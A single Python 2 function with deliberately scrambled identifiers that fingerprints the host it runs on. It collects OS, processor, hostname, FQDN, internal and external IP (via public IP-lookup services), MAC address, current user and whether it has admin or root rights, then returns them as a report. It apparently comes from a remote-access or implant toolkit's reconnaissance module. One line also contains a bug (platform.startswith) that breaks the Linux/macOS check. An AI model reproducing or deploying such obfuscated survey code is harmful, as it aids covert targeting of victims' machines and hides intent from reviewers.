# -*- coding: utf-8 -*-
import ctypes
import getpass
import os
import platform
import socket
import urllib
import uuid
def YdhlSQqGKFFyGZFIAPpNBTrabuGpkckg(plat_type):
    nOSNqOfVlTXOEUGvtcMjLiwsphmLByaa = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]
    PXQeVFejnwaOofJInoDhYGfbwxIIDrhX = getpass.getuser()
    suLJiOgNRVLOqYcmeOdVkmNasliFzSGO    = socket.gethostname()
    AazgYPLnUngmBvNVizJypvllAtyzGDIP        = socket.getfqdn()
    RsWtobxMlZBxHIszjslygtDVUoFUwdSq = socket.gethostbyname(suLJiOgNRVLOqYcmeOdVkmNasliFzSGO)
    pVvfrzsGyjxnwuCLWXydxXPcjblSVQyO     = uuid.getnode()
    vcLJxgAuFOJhQrRDsuRsYDcTUFojpQEK         = ':'.join(("%012X" % pVvfrzsGyjxnwuCLWXydxXPcjblSVQyO)[ceQRFUOFrPawwBpzwyuNDqxyGzBNWzOZ:ceQRFUOFrPawwBpzwyuNDqxyGzBNWzOZ+2] for ceQRFUOFrPawwBpzwyuNDqxyGzBNWzOZ in range(0, 12, 2))
    FCETrfyCnUIqJVuAwUWGAcbtwXnopUqN = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw' ]
    zrAfXdqRLRTPPOXLSrQYjpkobzrGuiMI = ''
    for aSKDoeoDPvsurgPhQYutVFRhigeWgwQe in FCETrfyCnUIqJVuAwUWGAcbtwXnopUqN:
        try:
            zrAfXdqRLRTPPOXLSrQYjpkobzrGuiMI = urllib.urlopen('http://'+aSKDoeoDPvsurgPhQYutVFRhigeWgwQe).read().rstrip()
        except IOError:
            pass
        if zrAfXdqRLRTPPOXLSrQYjpkobzrGuiMI and (6 < len(zrAfXdqRLRTPPOXLSrQYjpkobzrGuiMI) < 16):
            break
    NhQdcaOyCYLcSpbAsLuOREybXnmLXaEt = False
    if plat_type.startswith('win'):
        NhQdcaOyCYLcSpbAsLuOREybXnmLXaEt = ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif plat_type.startswith('linux') or platform.startswith('darwin'):
        NhQdcaOyCYLcSpbAsLuOREybXnmLXaEt = os.getuid() == 0
    ZgATAbBWVWhgWHafaljzzeCgzsJotoAW = 'Yes' if NhQdcaOyCYLcSpbAsLuOREybXnmLXaEt else 'No'
    zRjtwVaxkhUxdIoDoJENdvOiGyGuNyth = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Hostname            - {}
    FQDN                - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Current User        - {}
    Admin Access        - {}
    '''.format(nOSNqOfVlTXOEUGvtcMjLiwsphmLByaa, processor, architecture,
    suLJiOgNRVLOqYcmeOdVkmNasliFzSGO, AazgYPLnUngmBvNVizJypvllAtyzGDIP, RsWtobxMlZBxHIszjslygtDVUoFUwdSq, zrAfXdqRLRTPPOXLSrQYjpkobzrGuiMI, vcLJxgAuFOJhQrRDsuRsYDcTUFojpQEK, PXQeVFejnwaOofJInoDhYGfbwxIIDrhX, ZgATAbBWVWhgWHafaljzzeCgzsJotoAW)
    return zRjtwVaxkhUxdIoDoJENdvOiGyGuNyth
